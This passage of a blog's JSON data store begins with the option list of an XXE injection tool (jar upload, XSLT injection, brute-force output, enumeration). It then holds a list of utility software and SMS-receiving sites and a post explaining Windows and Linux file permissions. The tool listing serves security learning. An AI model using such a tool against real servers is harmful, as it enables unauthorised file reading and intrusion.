jar schema into temp file. (--                              upload=/tmp/upload.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--xslt\t    Tests for XSLT injection.</span><br><span class=\"line\"></span><br><span class=\"line\">--ssl\t    Use SSL.</span><br><span class=\"line\">--proxy\t    Proxy to use. (--proxy=127.0.0.1:8080)</span><br><span class=\"line\">--httpport\t   Set custom HTTP port. (--httpport=80)</span><br><span class=\"line\">--ftpport\t   Set custom FTP port. (--ftpport=21)</span><br><span class=\"line\">--gopherport   Set custom gopher port. (--gopherport=70)</span><br><span class=\"line\">--jarport\t   Set custom port for uploading files using jar. (--jarport=1337)</span><br><span class=\"line\">--xsltport\t   Set custom port for XSLT injection test. (--xsltport=1337)</span><br><span class=\"line\"></span><br><span class=\"line\">--test\t    该参数用于测试校验Payload。会将发送的Payload显示出来而不会发送到目标主机。</span><br><span class=\"line\"></span><br><span class=\"line\">--urlencode\tURL encode injected DTD. This is default for URI.</span><br><span class=\"line\">--nodtd\t     该参数用于想使用自己提供的dtd文件时，工具默认会生成并使用dtd文件。使用&quot;--dtd&quot;可以看dtd              文件格式。</span><br><span class=\"line\"></span><br><span class=\"line\">--output\t爆破的结果输出到的文件。 默认情况下爆破的结果存放在brute.log文件中</span><br><span class=\"line\">\t\t\t(--output=/tmp/out.txt)</span><br><span class=\"line\"></span><br><span class=\"line\">--timeout\t    Timeout for receiving file/directory content. (--timeout=20)</span><br><span class=\"line\">--contimeout\tTimeout for closing connection with server. This is used to prevent DoS                        condition. (--contimeout=20)</span><br><span class=\"line\"></span><br><span class=\"line\">--fast\t    Skip asking what to enumerate. Prone to false-positives.</span><br><span class=\"line\">--verbose\t    Show verbose messages.</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x03-XXE学习资源\"><a href=\"#0x03-XXE学习资源\" class=\"headerlink\" title=\"0x03 XXE学习资源\"></a>0x03 XXE学习资源</h2><p><a href=\"https://nosec.org/home/detail/2139.html\" target=\"_blank\" rel=\"noopener\">https://nosec.org/home/detail/2139.html</a></p>"},{"title":"干货杂项收集","date":"2019-02-22T04:55:01.000Z","_content":"\n## 概述\n\n记录收集的一些有用、有趣的站点或工具软件。\n\n工具全绿色，坚决不用有广告的软件。\n\n<!-- more -->\n\n**装机必备软件**\n\n- 开源绿色压缩、解压软件：[Banzip](http://www.bandisoft.com/bandizip/)\n- 绿色版迅雷5\n\n**简洁干净搜索主页**\n\n- KIM：https://www.zhuye.kim/\n- 柠檬搜索：http://www.llemon.cn/  \n- 柴度搜索：https://www.chaidu.com/\n- 安全导航：https://www.shentoushi.top/\n\n**Win2Mac 桌面美化**\n\n- 酷鱼桌面\n- 软媒桌面\n- [upupoo](http://www.upupoo.com/)：动态壁纸桌面 + 追番（神器）  \n- Wallpaper Engine：Steam平台付费。\n\n**PPT等资源**\n\n- http://www.hippter.com/\n  - 收纳了众多PPT模板等素材的网站。\n\n**效率工具**\n\n- [everything](https://www.voidtools.com/zh-cn/)：本地文件全局快速搜索。\n- [Snipaste](https://www.snipaste.com/)：截图工具\n- [quicker](https://sspai.com/post/47776)：效率效率。\n\n**在线云手机验证码接收，防骚扰**\n\n- https://sms.cngrok.com/receiving-sms\n- http://www.smszk.com/\n- https://sms.cm/\n- 地址大合集：https://bbs.ichunqiu.com/thread-48282-1-1.html\n\n**在线工具**\n\n- 全能在线工具：https://www.toolnb.com/\n\n**杂项Misc**\n\n- [Typora](https://theme.typora.io/)：Markdown Editor\n- [小书匠](http://soft.xiaoshujiang.com/)：在线Markdown Editor。\n- [LICEcap](https://www.cockos.com/licecap/)：gif动图录制工具。\n- [MPic](http://mpic.lzhaofu.cn/)：图床。\n- [IPic](https://toolinbox.net/iPic/)：图床。\n- [PicGo](https://sspai.com/post/42310)：图床。","source":"_posts/干货杂项收集.md","raw":"---\ntitle: 干货杂项收集\ndate: 2019-02-22 12:55:01\ntags: \n  - 收集\n  - 干货\ncategories: Misc\n---\n\n## 概述\n\n记录收集的一些有用、有趣的站点或工具软件。\n\n工具全绿色，坚决不用有广告的软件。\n\n<!-- more -->\n\n**装机必备软件**\n\n- 开源绿色压缩、解压软件：[Banzip](http://www.bandisoft.com/bandizip/)\n- 绿色版迅雷5\n\n**简洁干净搜索主页**\n\n- KIM：https://www.zhuye.kim/\n- 柠檬搜索：http://www.llemon.cn/  \n- 柴度搜索：https://www.chaidu.com/\n- 安全导航：https://www.shentoushi.top/\n\n**Win2Mac 桌面美化**\n\n- 酷鱼桌面\n- 软媒桌面\n- [upupoo](http://www.upupoo.com/)：动态壁纸桌面 + 追番（神器）  \n- Wallpaper Engine：Steam平台付费。\n\n**PPT等资源**\n\n- http://www.hippter.com/\n  - 收纳了众多PPT模板等素材的网站。\n\n**效率工具**\n\n- [everything](https://www.voidtools.com/zh-cn/)：本地文件全局快速搜索。\n- [Snipaste](https://www.snipaste.com/)：截图工具\n- [quicker](https://sspai.com/post/47776)：效率效率。\n\n**在线云手机验证码接收，防骚扰**\n\n- https://sms.cngrok.com/receiving-sms\n- http://www.smszk.com/\n- https://sms.cm/\n- 地址大合集：https://bbs.ichunqiu.com/thread-48282-1-1.html\n\n**在线工具**\n\n- 全能在线工具：https://www.toolnb.com/\n\n**杂项Misc**\n\n- [Typora](https://theme.typora.io/)：Markdown Editor\n- [小书匠](http://soft.xiaoshujiang.com/)：在线Markdown Editor。\n- [LICEcap](https://www.cockos.com/licecap/)：gif动图录制工具。\n- [MPic](http://mpic.lzhaofu.cn/)：图床。\n- [IPic](https://toolinbox.net/iPic/)：图床。\n- [PicGo](https://sspai.com/post/42310)：图床。","slug":"干货杂项收集","published":1,"updated":"2019-03-01T09:16:06.109Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjszpjg8z000hj8r0u0xzif51","content":"<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>记录收集的一些有用、有趣的站点或工具软件。</p>\n<p>工具全绿色，坚决不用有广告的软件。</p>\n<a id=\"more\"></a>\n<p><strong>装机必备软件</strong></p>\n<ul>\n<li>开源绿色压缩、解压软件：<a href=\"http://www.bandisoft.com/bandizip/\" target=\"_blank\" rel=\"noopener\">Banzip</a></li>\n<li>绿色版迅雷5</li>\n</ul>\n<p><strong>简洁干净搜索主页</strong></p>\n<ul>\n<li>KIM：<a href=\"https://www.zhuye.kim/\" target=\"_blank\" rel=\"noopener\">https://www.zhuye.kim/</a></li>\n<li>柠檬搜索：<a href=\"http://www.llemon.cn/\" target=\"_blank\" rel=\"noopener\">http://www.llemon.cn/</a>  </li>\n<li>柴度搜索：<a href=\"https://www.chaidu.com/\" target=\"_blank\" rel=\"noopener\">https://www.chaidu.com/</a></li>\n<li>安全导航：<a href=\"https://www.shentoushi.top/\" target=\"_blank\" rel=\"noopener\">https://www.shentoushi.top/</a></li>\n</ul>\n<p><strong>Win2Mac 桌面美化</strong></p>\n<ul>\n<li>酷鱼桌面</li>\n<li>软媒桌面</li>\n<li><a href=\"http://www.upupoo.com/\" target=\"_blank\" rel=\"noopener\">upupoo</a>：动态壁纸桌面 + 追番（神器）  </li>\n<li>Wallpaper Engine：Steam平台付费。</li>\n</ul>\n<p><strong>PPT等资源</strong></p>\n<ul>\n<li><a href=\"http://www.hippter.com/\" target=\"_blank\" rel=\"noopener\">http://www.hippter.com/</a><ul>\n<li>收纳了众多PPT模板等素材的网站。</li>\n</ul>\n</li>\n</ul>\n<p><strong>效率工具</strong></p>\n<ul>\n<li><a href=\"https://www.voidtools.com/zh-cn/\" target=\"_blank\" rel=\"noopener\">everything</a>：本地文件全局快速搜索。</li>\n<li><a href=\"https://www.snipaste.com/\" target=\"_blank\" rel=\"noopener\">Snipaste</a>：截图工具</li>\n<li><a href=\"https://sspai.com/post/47776\" target=\"_blank\" rel=\"noopener\">quicker</a>：效率效率。</li>\n</ul>\n<p><strong>在线云手机验证码接收，防骚扰</strong></p>\n<ul>\n<li><a href=\"https://sms.cngrok.com/receiving-sms\" target=\"_blank\" rel=\"noopener\">https://sms.cngrok.com/receiving-sms</a></li>\n<li><a href=\"http://www.smszk.com/\" target=\"_blank\" rel=\"noopener\">http://www.smszk.com/</a></li>\n<li><a href=\"https://sms.cm/\" target=\"_blank\" rel=\"noopener\">https://sms.cm/</a></li>\n<li>地址大合集：<a href=\"https://bbs.ichunqiu.com/thread-48282-1-1.html\" target=\"_blank\" rel=\"noopener\">https://bbs.ichunqiu.com/thread-48282-1-1.html</a></li>\n</ul>\n<p><strong>在线工具</strong></p>\n<ul>\n<li>全能在线工具：<a href=\"https://www.toolnb.com/\" target=\"_blank\" rel=\"noopener\">https://www.toolnb.com/</a></li>\n</ul>\n<p><strong>杂项Misc</strong></p>\n<ul>\n<li><a href=\"https://theme.typora.io/\" target=\"_blank\" rel=\"noopener\">Typora</a>：Markdown Editor</li>\n<li><a href=\"http://soft.xiaoshujiang.com/\" target=\"_blank\" rel=\"noopener\">小书匠</a>：在线Markdown Editor。</li>\n<li><a href=\"https://www.cockos.com/licecap/\" target=\"_blank\" rel=\"noopener\">LICEcap</a>：gif动图录制工具。</li>\n<li><a href=\"http://mpic.lzhaofu.cn/\" target=\"_blank\" rel=\"noopener\">MPic</a>：图床。</li>\n<li><a href=\"https://toolinbox.net/iPic/\" target=\"_blank\" rel=\"noopener\">IPic</a>：图床。</li>\n<li><a href=\"https://sspai.com/post/42310\" target=\"_blank\" rel=\"noopener\">PicGo</a>：图床。</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>记录收集的一些有用、有趣的站点或工具软件。</p>\n<p>工具全绿色，坚决不用有广告的软件。</p>","more":"<p><strong>装机必备软件</strong></p>\n<ul>\n<li>开源绿色压缩、解压软件：<a href=\"http://www.bandisoft.com/bandizip/\" target=\"_blank\" rel=\"noopener\">Banzip</a></li>\n<li>绿色版迅雷5</li>\n</ul>\n<p><strong>简洁干净搜索主页</strong></p>\n<ul>\n<li>KIM：<a href=\"https://www.zhuye.kim/\" target=\"_blank\" rel=\"noopener\">https://www.zhuye.kim/</a></li>\n<li>柠檬搜索：<a href=\"http://www.llemon.cn/\" target=\"_blank\" rel=\"noopener\">http://www.llemon.cn/</a>  </li>\n<li>柴度搜索：<a href=\"https://www.chaidu.com/\" target=\"_blank\" rel=\"noopener\">https://www.chaidu.com/</a></li>\n<li>安全导航：<a href=\"https://www.shentoushi.top/\" target=\"_blank\" rel=\"noopener\">https://www.shentoushi.top/</a></li>\n</ul>\n<p><strong>Win2Mac 桌面美化</strong></p>\n<ul>\n<li>酷鱼桌面</li>\n<li>软媒桌面</li>\n<li><a href=\"http://www.upupoo.com/\" target=\"_blank\" rel=\"noopener\">upupoo</a>：动态壁纸桌面 + 追番（神器）  </li>\n<li>Wallpaper Engine：Steam平台付费。</li>\n</ul>\n<p><strong>PPT等资源</strong></p>\n<ul>\n<li><a href=\"http://www.hippter.com/\" target=\"_blank\" rel=\"noopener\">http://www.hippter.com/</a><ul>\n<li>收纳了众多PPT模板等素材的网站。</li>\n</ul>\n</li>\n</ul>\n<p><strong>效率工具</strong></p>\n<ul>\n<li><a href=\"https://www.voidtools.com/zh-cn/\" target=\"_blank\" rel=\"noopener\">everything</a>：本地文件全局快速搜索。</li>\n<li><a href=\"https://www.snipaste.com/\" target=\"_blank\" rel=\"noopener\">Snipaste</a>：截图工具</li>\n<li><a href=\"https://sspai.com/post/47776\" target=\"_blank\" rel=\"noopener\">quicker</a>：效率效率。</li>\n</ul>\n<p><strong>在线云手机验证码接收，防骚扰</strong></p>\n<ul>\n<li><a href=\"https://sms.cngrok.com/receiving-sms\" target=\"_blank\" rel=\"noopener\">https://sms.cngrok.com/receiving-sms</a></li>\n<li><a href=\"http://www.smszk.com/\" target=\"_blank\" rel=\"noopener\">http://www.smszk.com/</a></li>\n<li><a href=\"https://sms.cm/\" target=\"_blank\" rel=\"noopener\">https://sms.cm/</a></li>\n<li>地址大合集：<a href=\"https://bbs.ichunqiu.com/thread-48282-1-1.html\" target=\"_blank\" rel=\"noopener\">https://bbs.ichunqiu.com/thread-48282-1-1.html</a></li>\n</ul>\n<p><strong>在线工具</strong></p>\n<ul>\n<li>全能在线工具：<a href=\"https://www.toolnb.com/\" target=\"_blank\" rel=\"noopener\">https://www.toolnb.com/</a></li>\n</ul>\n<p><strong>杂项Misc</strong></p>\n<ul>\n<li><a href=\"https://theme.typora.io/\" target=\"_blank\" rel=\"noopener\">Typora</a>：Markdown Editor</li>\n<li><a href=\"http://soft.xiaoshujiang.com/\" target=\"_blank\" rel=\"noopener\">小书匠</a>：在线Markdown Editor。</li>\n<li><a href=\"https://www.cockos.com/licecap/\" target=\"_blank\" rel=\"noopener\">LICEcap</a>：gif动图录制工具。</li>\n<li><a href=\"http://mpic.lzhaofu.cn/\" target=\"_blank\" rel=\"noopener\">MPic</a>：图床。</li>\n<li><a href=\"https://toolinbox.net/iPic/\" target=\"_blank\" rel=\"noopener\">IPic</a>：图床。</li>\n<li><a href=\"https://sspai.com/post/42310\" target=\"_blank\" rel=\"noopener\">PicGo</a>：图床。</li>\n</ul>"},{"title":"文件与目录权限","date":"2019-02-28T00:58:56.000Z","_content":"\n## 0x00 Windows文件与文件夹权限\n\n| 权限           | 对于文件夹                                                   | 对于文件                                                     |\n| -------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| 读取           | 允许查看并列出文件和子文件夹（Viewing、Listing）             | 允许查看和访问文件内容（Viewing、Accessing）                 |\n| 写入           | 允许添加文件和子文件夹(Adding)                               | 允许写入一个文件(Writing)                                    |\n| 读取和执行     | 允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 由文件和文件夹继承 | 允许查看和访问文件的内容以及执行文件（Viewing、Accessing、Excuting） |\n| 列出文件夹内容 | 允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 仅由文件夹继承 | N / A                                                        |\n| 修改           | 允许读取和写入文件和子文件夹（Reading、Writing）; 允许删除文件夹(Delete) | 允许读取和写入文件(Reading、Writing); 允许删除文件（Delete） |\n| 完全控制       | 允许读取，写入，更改和删除文件和子文件夹(Reading、Writing、Changing、Deleting) | 允许读取，写入，更改和删除文件(Reading、Writing、Deleting)   |\n\n<!-- more -->\n\n- **读取(Reading)是运行脚本(Run script)所需的唯一权限。执行（Excuting）权限无关紧要。**\n\n> Windows依据文件后缀来识别文件类型。如可执行程序：.exe、.bat、.com等。\n>\n> Linux通过\"x\"权限属性标识是否可执行。\n>\n> ------\n>\n> 脚本是由脚本语言编写的文件，脚本语言无需进行编译就可以通过解释器解释运行。\n\n- **授予用户写入文件但不删除文件的权限不能阻止用户删除文件的内容。用户仍然可以删除内容。**\n- **如果用户完全控制文件夹，则无论文件的权限如何，用户都可以删除文件夹中的文件。**\n\n**Windows文件或文件夹权限查看**\n\n右键文件或文件夹 ——> 属性 ——> 安全。\n\n![](文件与目录权限\\QQ截图20190228092238.png)\n\n**参考链接：**\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)\n\n## 0x01 Linux文件及目录权限\n\nLinux权限是针对文件内容设计的，对于文件和目录而言，文件内容代指不同的东西：\n\n- 文件：文件内容是文件存储的data。\n- 目录：文件内容是目录下的文件名。\n\n| 对象 |    文件内容    |            r             |                     w                      |        x         |\n| :--: | :------------: | :----------------------: | :----------------------------------------: | :--------------: |\n| 文件 |  文件内的数据  |      可读取文件内容      | 修改文件内容（编辑、增、改、不能删除文件） |     执行文件     |\n| 目录 | 目录下的文件名 | 可读取看到目录下的文件名 |               可异动目录结构               | 可进入目录的权限 |\n\n**权限对于目录：**\n\n- **r**\n\n> 读取文件结构的权限，即可以获得目录下的文件名清单。可执行`ls`命令。\n\n- **w**\n\n> 创建文件或目录。（`touch`、`mkdir`）\n>\n> 删除文件或目录。（不论文件的权限如何）(`rm、rmdir`)\n>\n> 重命名文件或目录。（`cp`）\n>\n> 移动文件或目录。(`mv`)\n\n- **x**\n\n> 能否作为工作目录。工作目录即用户当前所在的路径就是当前的工作目录。即该权限就是能否进入该目录，即能否`cd`进去。\n\n**例子：**\n\n![](文件与目录权限\\QQ截图20190228101906.png)\n\n- **要操作一个目录下的文件，拥有进入该目录的权限是必需的，“x”权限相当于key。“r”权限不是必需的，就像摸黑到书房取书，进入书房的钥匙是必需的，但是可以不用看到书架上的书名。没有“r”权限，命令里路径将不能补全。**\n- **因此在搭建WEB服务器时，运行HTTP服务的用户对网站的根目录应该具有\"rx\"权限。具体权限配置可参考连接：**https://www.cnblogs.com/sochishun/p/7413572.html\n\n**改变文件权限：**\n\n![](文件与目录权限\\QQ截图20190228105825.png)","source":"_posts/文件与目录权限.md","raw":"---\ntitle: 文件与目录权限\ndate: 2019-02-28 08:58:56\ntags:\n\t- 文件权限\ncategories: Misc\n---\n\n## 0x00 Windows文件与文件夹权限\n\n| 权限           | 对于文件夹                                                   | 对于文件                                                     |\n| -------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| 读取           | 允许查看并列出文件和子文件夹（Viewing、Listing）             | 允许查看和访问文件内容（Viewing、Accessing）                 |\n| 写入           | 允许添加文件和子文件夹(Adding)                               | 允许写入一个文件(Writing)                                    |\n| 读取和执行     | 允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 由文件和文件夹继承 | 允许查看和访问文件的内容以及执行文件（Viewing、Accessing、Excuting） |\n| 列出文件夹内容 | 允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 仅由文件夹继承 | N / A                                                        |\n| 修改           | 允许读取和写入文件和子文件夹（Reading、Writing）; 允许删除文件夹(Delete) | 允许读取和写入文件(Reading、Writing); 允许删除文件（Delete） |\n| 完全控制       | 允许读取，写入，更改和删除文件和子文件夹(Reading、Writing、Changing、Deleting) | 允许读取，写入，更改和删除文件(Reading、Writing、Deleting)   |\n\n<!-- more -->\n\n- **读取(Reading)是运行脚本(Run script)所需的唯一权限。执行（Excuting）权限无关紧要。**\n\n> Windows依据文件后缀来识别文件类型。如可执行程序：.exe、.bat、.com等。\n>\n> Linux通过\"x\"权限属性标识是否可执行。\n>\n> ------\n>\n> 脚本是由脚本语言编写的文件，脚本语言无需进行编译就可以通过解释器解释运行。\n\n- **授予用户写入文件但不删除文件的权限不能阻止用户删除文件的内容。用户仍然可以删除内容。**\n- **如果用户完全控制文件夹，则无论文件的权限如何，用户都可以删除文件夹中的文件。**\n\n**Windows文件或文件夹权限查看**\n\n右键文件或文件夹 ——> 属性 ——> 安全。\n\n![](文件与目录权限\\QQ截图20190228092238.png)\n\n**参考链接：**\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)\n\n## 0x01 Linux文件及目录权限\n\nLinux权限是针对文件内容设计的，对于文件和目录而言，文件内容代指不同的东西：\n\n- 文件：文件内容是文件存储的data。\n- 目录：文件内容是目录下的文件名。\n\n| 对象 |    文件内容    |            r             |                     w                      |        x         |\n| :--: | :------------: | :----------------------: | :----------------------------------------: | :--------------: |\n| 文件 |  文件内的数据  |      可读取文件内容      | 修改文件内容（编辑、增、改、不能删除文件） |     执行文件     |\n| 目录 | 目录下的文件名 | 可读取看到目录下的文件名 |               可异动目录结构               | 可进入目录的权限 |\n\n**权限对于目录：**\n\n- **r**\n\n> 读取文件结构的权限，即可以获得目录下的文件名清单。可执行`ls`命令。\n\n- **w**\n\n> 创建文件或目录。（`touch`、`mkdir`）\n>\n> 删除文件或目录。（不论文件的权限如何）(`rm、rmdir`)\n>\n> 重命名文件或目录。（`cp`）\n>\n> 移动文件或目录。(`mv`)\n\n- **x**\n\n> 能否作为工作目录。工作目录即用户当前所在的路径就是当前的工作目录。即该权限就是能否进入该目录，即能否`cd`进去。\n\n**例子：**\n\n![](文件与目录权限\\QQ截图20190228101906.png)\n\n- **要操作一个目录下的文件，拥有进入该目录的权限是必需的，“x”权限相当于key。“r”权限不是必需的，就像摸黑到书房取书，进入书房的钥匙是必需的，但是可以不用看到书架上的书名。没有“r”权限，命令里路径将不能补全。**\n- **因此在搭建WEB服务器时，运行HTTP服务的用户对网站的根目录应该具有\"rx\"权限。具体权限配置可参考连接：**https://www.cnblogs.com/sochishun/p/7413572.html\n\n**改变文件权限：**\n\n![](文件与目录权限\\QQ截图20190228105825.png)","slug":"文件与目录权限","published":1,"updated":"2019-02-28T03:40:14.958Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjszpjg96000ij8r0p22ku57a","content":"<h2 id=\"0x00-Windows文件与文件夹权限\"><a href=\"#0x00-Windows文件与文件夹权限\" class=\"headerlink\" title=\"0x00 Windows文件与文件夹权限\"></a>0x00 Windows文件与文件夹权限</h2><table>\n<thead>\n<tr>\n<th>权限</th>\n<th>对于文件夹</th>\n<th>对于文件</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>读取</td>\n<td>允许查看并列出文件和子文件夹（Viewing、Listing）</td>\n<td>允许查看和访问文件内容（Viewing、Accessing）</td>\n</tr>\n<tr>\n<td>写入</td>\n<td>允许添加文件和子文件夹(Adding)</td>\n<td>允许写入一个文件(Writing)</td>\n</tr>\n<tr>\n<td>读取和执行</td>\n<td>允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 由文件和文件夹继承</td>\n<td>允许查看和访问文件的内容以及执行文件（Viewing、Accessing、Excuting）</td>\n</tr>\n<tr>\n<td>列出文件夹内容</td>\n<td>允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 仅由文件夹继承</td>\n<td>N / A</td>\n</tr>\n<tr>\n<td>修改</td>\n<td>允许读取和写入文件和子文件夹（Reading、Writing）; 允许删除文件夹(Delete)</td>\n<td>允许读取和写入文件(Reading、Writing); 允许删除文件（Delete）</td>\n</tr>\n<tr>\n<td>完全控制</td>\n<td>允许读取，写入，更改和删除文件和子文件夹(Reading、Writing、Changing、Deleting)</td>\n<td>允许读取，写入，更改和删除文件(Reading、Writing、Deleting)</td>\n</tr>\n</tbody>\n</table>\n<a id=\"more\"></a>\n<ul>\n<li><strong>读取(Reading)是运行脚本(Run script)所需的唯一权限。执行（Excuting）权限无关紧要。</strong></li>\n</ul>\n<blockquote>\n<p>Windows依据文件后缀来识别文件类型。如可执行程序：.exe、.bat、.com等。</p>\n<p>Linux通过”x”权限属性标识是否可执行。</p>\n<hr>\n<p>脚本是由脚本语言编写的文件，脚本语言无需进行编译就可以通过解释器解释运行。</p>\n</blockquote>\n<ul>\n<li><strong>授予用户写入文件但不删除文件的权限不能阻止用户删除文件的内容。用户仍然可以删除内容。</strong></li>\n<li><strong>如果用户完全控制文件夹，则无论文件的权限如何，用户都可以删除文件夹中的文件。</strong></li>\n</ul>\n<p><strong>Windows文件或文件夹权限查看</strong></p>\n<p>右键文件或文件夹 ——&gt; 属性 ——&gt; 安全。</p>\n<p><img src=\"/2019/02/28/文件与目录权限/QQ截图20190228092238.png\" alt></p>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)\" target=\"_blank\" rel=\"noopener\">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)</a></p>\n<h2 id=\"0x01-Linux文件及目录权限\"><a href=\"#0x01-Linux文件及目录权限\" class=\"headerlink\" title=\"0x01 Linux文件及目录权限\"></a>0x01 Linux文件及目录权限</h2><p>Linux权限是针对文件内容设计的，对于文件和目录而言，文件内容代指不同的东西：</p>\n<ul>\n<li>文件：文件内容是文件存储的data。</li>\n<li>目录：文件内容是目录下的文件名。</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">对象</th>\n<th style=\"text-align:center\">文件内容</th>\n<th style=\"text-align:center\">r</th>\n<th style=\"text-align:center\">w</th>\n<th style=\"text-align:center\">x</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">文件</td>\n<td style=\"text-align:center\">文件内的数据</td>\n<td style=\"text-align:center\">可读取文件内容</td>\n<td style=\"text-align:center\">修改文件内容（编辑、增、改、不能删除文件）</td>\n<td style=\"text-align:center\">执行文件</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">目录</td>\n<td style=\"text-align:center\">目录下的文件名</td>\n<td style=\"text-align:center\">可读取看到目录下的文件名</td>\n<td style=\"text-align:center\">可异动目录结构</td>\n<td style=\"text-align:center\">可进入目录的权限</td>\n</tr>\n</tbody>\n</table>\n<p><strong>权限对于目录：</strong></p>\n<ul>\n<li><strong>r</strong></li>\n</ul>\n<blockquote>\n<p>读取文件结构的权限，即可以获得目录下的文件名清单。可执行<code>ls</code>命令。</p>\n</blockquote>\n<ul>\n<li><strong>w</strong></li>\n</ul>\n<blockquote>\n<p>创建文件或目录。（<code>touch</code>、<code>mkdir</code>）</p>\n<p>删除文件或目录。（不论文件的权限如何）(<code>rm、rmdir</code>)</p>\n<p>重命名文件或目录。（<code>cp</code>）</p>\n<p>移动文件或目录。(<code>mv</code>)</p>\n</blockquote>\n<ul>\n<li><strong>x</strong></li>\n</ul>\n<blockquote>\n<p>能否作为工作目录。工作目录即用户当前所在的路径就是当前的工作目录。即该权限就是能否进入该目录，即能否<code>cd</code>进去。</p>\n</blockquote>\n<p><strong>例子：</strong></p>\n<p><img src=\"/2019/02/28/文件与目录权限/QQ截图20190228101906.png\" alt></p>\n<ul>\n<li><strong>要操作一个目录下的文件，拥有进入该目录的权限是必需的，“x”权限相当于key。“r”权限不是必需的，就像摸黑到书房取书，进入书房的钥匙是必需的，但是可以不用看到书架上的书名。没有“r”权限，命令里路径将不能补全。</strong></li>\n<li><strong>因此在搭建WEB服务器时，运行HTTP服务的用户对网站的根目录应该具有”rx”权限。具体权限配置可参考连接：</strong><a href=\"https://www.cnblogs.com/sochishun/p/7413572.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/sochishun/p/7413572.html</a></li>\n</ul>\n<p><strong>改变文件权限：</strong></p>\n<p><img src=\"/2019/02/28/文件与目录权限/QQ截图20190228105825.png\" alt></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-Windows文件与文件夹权限\"><a href=\"#0x00-Windows文件与文件夹权限\" class=\"headerlink\" title=\"0x00 Windows文件与文件夹权限\"></a>0x00 Windows文件与文件夹权限</h2><table>\n<thead>\n<tr>\n<th>权限</th>\n<th>对于文件夹</th>\n<th>对于文件</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>读取</td>\n<td>允许查看并列出文件和子文件夹（Viewing、Listing）</td>\n<td>允许查看和访问文件内容（Viewing、Accessing）</td>\n</tr>\n<tr>\n<td>写入</td>\n<td>允许添加文件和子文件夹(Adding)</td>\n<td>允许写入一个文件(Writing)</td>\n</tr>\n<tr>\n<td>读取和执行</td>\n<td>允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 由文件和文件夹继承</td>\n<td>允许查看和访问文件的内容以及执行文件（Viewing、Accessing、Excuting）</td>\n</tr>\n<tr>\n<td>列出文件夹内容</td>\n<td>允许查看和列出文件和子文件夹以及执行文件（Viewing、Listing、Excuting）; 仅由文件夹继承</td>\n<td>N / A</td>\n</tr>\n<tr>\n<td>修改</td>\n<td>允许读取和写入文件和子文件夹（Reading、Writing）; 允许删除文件夹(Delete)</td>\n<td>允许读取和写入文件(Reading、Writing); 允许删除文件（Delete）</td>\n</tr>\n<tr>\n<td>完全控制</td>\n<td>允许读取，写入，更改和删除文件和子文件夹(Reading、Writing、Changing、Deleting)</td>\n<td>允许读取，写入，更改和删除文件(Reading、Writing、Deleting)</td>\n</tr>\n</tbody>\n</table>","more":"<ul>\n<li><strong>读取(Reading)是运行脚本(Run script)所需的唯一权限。执行（Excuting）权限无关紧要。</strong></li>\n</ul>\n<blockquote>\n<p>Windows依据文件后缀来识别文件类型。如可执行程序：.exe、.bat、.com等。</p>\n<p>Linux通过”x”权限属性标识是否可执行。</p>\n<hr>\n<p>脚本是由脚本语言编写的文件，脚本语言无需进行编译就可以通过解释器解释运行。</p>\n</blockquote>\n<ul>\n<li><strong>授予用户写入文件但不删除文件的权限不能阻止用户删除文件的内容。用户仍然可以删除内容。</strong></li>\n<li><strong>如果用户完全控制文件夹，则无论文件的权限如何，用户都可以删除文件夹中的文件。</strong></li>\n</ul>\n<p><strong>Windows文件或文件夹权限查看</strong></p>\n<p>右键文件或文件夹 ——&gt; 属性 ——&gt; 安全。</p>\n<p><img src=\"/2019/02/28/文件与目录权限/QQ截图20190228092238.png\" alt></p>\n<p><strong>参考链接：</strong></p>\n<p><a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)\" target=\"_blank\" rel=\"noopener\">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727008(v=technet.10)</a></p>\n<h2 id=\"0x01-Linux文件及目录权限\"><a href=\"#0x01-Linux文件及目录权限\" class=\"headerlink\" title=\"0x01 Linux文件及目录权限\"></a>0x01 Linux文件及目录权限</h2><p>Linux权限是针对文件内容设计的，对于文件和目录而言，文件内容代指不同的东西：</p>\n<ul>\n<li>文件：文件内容是文件存储的data。</li>\n<li>目录：文件内容是目录下的文件名。</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">对象</th>\n<th style=\"text-align:center\">文件内容</th>\n<th style=\"text-align:center\">r</th>\n<th style=\"text-align:center\">w</th>\n<th style=\"text-align:center\">x</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">文件</td>\n<td style=\"text-align:center\">文件内的数据</td>\n<td style=\"text-align:center\">可读取文件内容</td>\n<td 